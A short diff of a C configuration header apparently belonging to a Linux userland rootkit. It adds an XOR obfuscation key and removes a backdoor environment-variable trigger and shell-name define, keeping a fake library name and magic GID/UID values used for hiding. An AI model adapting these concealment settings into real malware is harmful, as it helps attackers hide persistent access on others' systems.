@@ -3,15 +3,13 @@
 
 #define DEBUG 1
 
+#define XORKEY          (uint32_t)0xdeadbeef;
+
 #define LIBC_PATH       "/lib/x86_64-linux-gnu/libc.so.6"
 
 #define MAGIC_STRING    "libc.so.0"
 #define MAGIC_GID       197
 #define MAGIC_UID       197
-
-#define ENV_VARIABLE    "XSH"
-
-#define SHELL_NAME      MAGIC_STRING
 
 #ifdef __i386__
 #define BUILD_ARCH      "i686"
